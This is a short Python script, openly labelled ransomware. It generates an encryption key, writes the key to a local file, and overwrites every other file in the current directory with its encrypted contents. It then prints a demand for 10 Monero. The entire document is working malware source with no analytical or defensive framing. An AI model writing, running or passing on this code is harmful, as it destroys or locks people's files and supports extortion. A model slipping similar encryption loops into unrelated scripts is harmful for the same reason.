import os
from cryptography.fernet import Fernet

def ransomware_encrypt():
    exclude_files = ["script.py", "thekey.key", "deckey.py", "script", "deckey"]
    key = Fernet.generate_key()
    
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in os.listdir():
        if file in exclude_files:
            continue
        if os.path.isfile(file):
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)

    print("This is a ransomware attack. All files are encrypted. Send 10 Monero at xyz.com")

if __name__ == "__main__":
    ransomware_encrypt()